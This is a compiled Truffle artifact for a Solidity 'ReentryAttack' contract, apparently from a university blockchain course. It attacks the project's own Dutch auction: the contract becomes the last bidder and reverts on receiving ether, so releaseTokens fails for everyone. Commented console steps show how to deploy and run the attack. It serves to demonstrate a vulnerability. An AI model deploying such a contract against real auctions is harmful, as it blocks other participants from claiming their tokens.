{
  "contractName": "ReentryAttack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "auctionAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "commit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161028c38038061028c8339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506101b7806100d56000396000f3fe6080604052600436106100225760003560e01c80633c7a3aff1461009a57610095565b36610095576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260148152602001807f596f7520617265206861636b65642c206861686100000000000000000000000081525060200191505060405180910390fd5b600080fd5b6100a26100a4565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146100fe57600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633c7a3aff346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561016657600080fd5b505af115801561017a573d6000803e3d6000fd5b505050505056fea26469706673582212202f1376e4915e5116009b1d08e7f02ef734eba49d10f251d40d884cbec11126a864736f6c634300060c0033",
  "immutableReferences": {},
  "source": "pragma solidity ^0.6.0;\r\n\r\nimport \"./AuctionAgainstReentry.sol\";\r\nimport \"./CypherpunkCoin.sol\";\r\n\r\n// auction.startPrice() * 10**12 * auction.tokenSupply()\r\n// address(auction).delegatecall(abi.encodeWithSignature(\"commit()\"));\r\n\r\n// the trick is try to become the last bidder and exploit releaseTokens as\r\n// it transfer ether to an external agent\r\n\r\n// this reentry attack will work with the auction\r\n// of startPrice = 3000, endingPrice = 2000 and supply = 200 in 5 minutes\r\n// here we attack the method releaseTokens\r\n// the amount of commit is 1 Eth, which makes demand higher than the supply\r\n// and this contract will be the last bidder\r\n// however, when others want to release the tokens, Auction contract\r\n// will have to pay this contract, and call the payable function, which\r\n// call release tokens again and generate errors\r\n// therefore, no one can claim the tokens because of this attack\r\ncontract ReentryAttack {\r\n    Auction auction;\r\n    address owner;\r\n\r\n    constructor(address auctionAddress) public {\r\n        auction = Auction(auctionAddress);\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function commit() external payable {\r\n        require(msg.sender == owner);\r\n        auction.commit.value(msg.value)();\r\n    }\r\n\r\n    receive() external payable {\r\n        revert(\"You are hacked, haha\");\r\n    }\r\n}\r\n\r\n// these lines are instructions to attack\r\n// truffle migrate --reset\r\n// truffle console\r\n// cypherPunk = await CypherpunkCoin.deployed()\r\n// cypherPunk.createAuction(3000,2000,200,5)\r\n// auctionAddress = await cypherPunk.auctionAddress()\r\n// attack = await ReentryAttack.new(auctionAddress)\r\n// cypherPunk.openCurrAuction()\r\n// auction = await Auction.at(auctionAddress)\r\n// auction.commit({value: 100000000000000000, from:accounts[1]}) // send from accounts[1]\r\n// attack.commit({value: 1000000000000000000})\r\n// auction.releaseTokens() --> can not release\r\n",
  "sourcePath": "F:/NTU/Courses/Sem 1 2020-2021/Blockchain Technology/CZ4153-Dutch-Contract/contracts/ReentryAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.6.12+commit.27d51765.Emscripten.clang"
  },
  "schemaVersion": "3.3.1",
  "updatedAt": "2020-11-26T13:20:29.758Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}